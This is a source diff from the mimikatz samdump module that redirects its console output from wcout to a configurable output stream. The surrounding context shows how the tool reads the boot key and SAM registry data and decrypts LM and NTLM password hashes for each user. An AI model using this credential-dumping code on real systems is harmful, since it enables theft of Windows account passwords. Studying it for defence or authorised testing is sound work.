@@ -31,7 +31,7 @@ bool mod_mimikatz_samdump::full(vector<wstring> * arguments)
 		if(getInfosFromHive(arguments->front().c_str(), bootkey))
 		{
 			if(!getUsersAndHashesFromHive(arguments->back().c_str(), bootkey))
-				wcout << L"Erreur lors de l\'exploration des ruches" << endl;
+				(*outputStream) << L"Erreur lors de l\'exploration des ruches" << endl;
 		}
 	}
 	else
@@ -39,7 +39,7 @@ bool mod_mimikatz_samdump::full(vector<wstring> * arguments)
 		if(getInfosFromReg(bootkey))
 		{
 			if(!getUsersAndHashesFromReg(bootkey))
-				wcout << L"Erreur lors de l\'exploration du registre" << endl;
+				(*outputStream) << L"Erreur lors de l\'exploration du registre" << endl;
 		}
 	}
 	return true;
@@ -127,11 +127,11 @@ bool mod_mimikatz_samdump::getInfosFromHive(wstring systemHive, unsigned char bo
 
 				wstring * computerName = new wstring();
 				if(getComputerNameFromHive(monHive, fullControlSet, computerName))
-					wcout << L"Ordinateur : " << *computerName << endl;
+					(*outputStream) << L"Ordinateur : " << *computerName << endl;
 				delete computerName;
 
 				if(reussite = getBootKeyFromHive(monHive, fullControlSet, bootkey))
-					wcout << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
+					(*outputStream) << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
 				delete fullControlSet;
 			}
 		}
@@ -213,12 +213,12 @@ bool mod_mimikatz_samdump::getBootKeyFromReg(BYTE bootkey[0x10])
 				code = RegQueryInfoKey(monSecret, monBuffer, &maTaille, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 				if(code == ERROR_SUCCESS)
 					swscanf_s(monBuffer, L"%x", (DWORD *) (&key[i * sizeof(DWORD)]));
-				else wcout << L"RegQueryInfoKey " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
+				else (*outputStream) << L"RegQueryInfoKey " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
 				RegCloseKey(monSecret);
-			} else wcout << L"RegOpenKeyEx " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
+			} else (*outputStream) << L"RegOpenKeyEx " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
 		}
 		RegCloseKey(monLSA);
-	} else wcout << L"RegOpenKeyEx LSA : " << mod_system::getWinError(false, code) << endl;
+	} else (*outputStream) << L"RegOpenKeyEx LSA : " << mod_system::getWinError(false, code) << endl;
 
 	if(reussite = (code == ERROR_SUCCESS))
 		mod_hash::getBootKeyFromKey(bootkey, key);
@@ -253,11 +253,11 @@ bool mod_mimikatz_samdump::getInfosFromReg(BYTE bootkey[0x10])
 
 	wstring * computerName = new wstring();
 	if(mod_system::getComputerName(computerName))
-		wcout << L"Ordinateur : " << *computerName << endl;
+		(*outputStream) << L"Ordinateur : " << *computerName << endl;
 	delete computerName;
 
 	if(reussite = getBootKeyFromReg(bootkey))
-		wcout << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
+		(*outputStream) << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
 
 	return reussite;
 }
@@ -321,18 +321,18 @@ bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 											RegCloseKey(monUser);
 										}
 									}
-								} else wcout << L"RegEnumKeyExW : " << mod_system::getWinError(false, code) << endl;
+								} else (*outputStream) << L"RegEnumKeyExW : " << mod_system::getWinError(false, code) << endl;
 							}
 							delete[] monRid;
 						}
 						RegCloseKey(mesUsers);
-					} else wcout << L"RegOpenKeyEx Users : " << mod_system::getWinError(false, code) << endl;
+					} else (*outputStream) << L"RegOpenKeyEx Users : " << mod_system::getWinError(false, code) << endl;
 				}
-			} else wcout << L"RegQueryValueEx 2 F : " << mod_system::getWinError(false, code) << endl;
+			} else (*outputStream) << L"RegQueryValueEx 2 F : " << mod_system::getWinError(false, code) << endl;
 			delete[] bufferF;
-		} else wcout << L"RegQueryValueEx 1 F : " << mod_system::getWinError(false, code) << endl;
+		} else (*outputStream) << L"RegQueryValueEx 1 F : " << mod_system::getWinError(false, code) << endl;
 		RegCloseKey(maSAM);
-	} else wcout << L"RegOpenKeyEx SAM : " << mod_system::getWinError(false, code) << endl;
+	} else (*outputStream) << L"RegOpenKeyEx SAM : " << mod_system::getWinError(false, code) << endl;
 
 	return reussite;
 }
@@ -342,7 +342,7 @@ void mod_mimikatz_samdump::infosFromUserAndKey(mod_hash::USER_F * userF, mod_has
 	wstring hashLM, hashNTLM;
 	mod_hash::decryptHash(&hashLM, hBootKey, userV, &userV->LM, userF->UserId, false);
 	mod_hash::decryptHash(&hashNTLM, hBootKey, userV, &userV->NTLM, userF->UserId, true);
-	wcout << endl <<
+	(*outputStream) << endl <<
 		L"Rid  : " <<  userF->UserId << endl <<
 		L"User : " << wstring((wchar_t *) (&(userV->datas) + userV->Username.offset), userV->Username.lenght / sizeof(wchar_t)) << endl <<
 		L"LM   : " << hashLM << endl <<
